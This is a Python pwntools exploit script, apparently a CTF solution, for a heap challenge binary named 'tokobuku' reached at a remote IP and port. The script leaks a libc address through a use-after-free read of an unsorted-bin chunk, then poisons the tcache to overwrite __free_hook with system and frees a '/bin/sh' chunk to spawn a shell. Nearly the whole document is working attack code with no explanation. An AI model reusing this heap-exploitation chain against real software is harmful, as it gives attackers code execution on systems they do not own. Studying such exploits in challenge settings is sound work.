#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './tokobuku_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc 143.198.215.203 20040'.split()

libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
            if hasattr(resolved, 'address'):
                resolved = getattr(resolved, 'address')
                if not resolved & 0xfff:
                    log.success(
                        term.text.bold_green(f'{name}.address & 0xFFF == 0')
                        )
                else:
                    log.warn(
                        term.text.bold_yellow(f'{name}.address & 0xFFF != 0')
                        )
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda:...
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda:...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    
def malloc(idx, sz, x=b'adamadam'):
    p.sendline(b'1')
    p.sendline(str(idx).encode())
    p.sendline(str(sz).encode())
    p.sendline(x)

def free(idx):
    p.sendline(b'2')
    p.sendline(str(idx).encode())

def puts(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def scanf(idx, x):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    p.sendline(x)

gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

p = start()

# unsorted bin leak
sz = 64
ubsz = 0x420
malloc(1, sz)
malloc(2, ubsz)
malloc(3, 0x20)

free(1)
free(2)

p.clean(1)
puts(2)

a = p.recvuntil(b'judul buku: ')
libc.address = ua(p.recvline()[:-1]) - (libc.sym.main_arena + 96)
logx.libc

sz2 = 256
free_hook = libc.sym.__free_hook
logx.free_hook

# tcache
malloc(1, sz)
malloc(4, sz2)
malloc(5, sz2)
free(4)
free(5)
scanf(5, p64(free_hook))
malloc(6, sz2)
malloc(7, sz2, p64(libc.sym.system))
malloc(8, sz2, b'/bin/sh\0')
free(8)

p.interactive()